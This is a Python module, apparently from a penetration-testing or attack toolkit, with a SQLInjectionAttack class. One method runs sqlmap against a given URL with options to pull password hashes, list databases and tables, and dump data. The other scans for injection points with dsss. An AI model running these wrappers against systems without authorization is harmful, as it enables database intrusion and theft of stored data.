from .random_string_generator import RandomStringGenerator
import logging
import subprocess
import os
import dsss


class SQLInjectionAttack:
    def sqlmap_attack(
        self,
        target_url,
        level=1,
        risk=1,
        password=False,
        dbs=False,
        tables=False,
        database=None,
        dump=False,
        TBL=None,
    ):
        logging.info("Attacking %s with SQLMap...", target_url)
        path_to_executable = os.path.join(os.path.dirname(__file__), "sqlmap/sqlmap.py")
        command = [
            "python3",
            path_to_executable,
            "-u",
            target_url,
            "--batch",
            "--level",
            str(level),
            "--risk",
            str(risk),
            "--passwords" if password else "",
            "--dbs" if dbs else "",
            "--tables" if tables else "",
            "-D" if database else "",
            database if database else "",
            "--dump" if dump else "",
            "-T" if TBL else "",
            TBL if TBL else "",
        ]
        subprocess.run(command)

    def sqli_scanner(
        self, target_url, data=None, cookie=None, ua=None, referer=None, proxy=None
    ):
        """Scans the target_url for potential SQL injection vulnerabilities.

        Args:
        - target_url (str): The target URL to scan.
        - data (str, optional): POST data to send with the request.
        - cookie (str, optional): HTTP Cookie header value.
        - ua (str, optional): HTTP User-Agent header value.
        - referer (str, optional): HTTP Referer header value.
        - proxy (str, optional): HTTP proxy address.

        Returns:
        - bool: True if potential vulnerabilities are found, False otherwise.
        """

        # Initialize options for the scanner
        dsss.init_options(proxy=proxy, cookie=cookie, ua=ua, referer=referer)

        # Scan the target URL
        result = dsss.scan_page(target_url, data)

        # Print the result
        logging.info(
            "\nscan results: %s vulnerabilities found"
            % ("possible" if result else "no")
        )

        return result
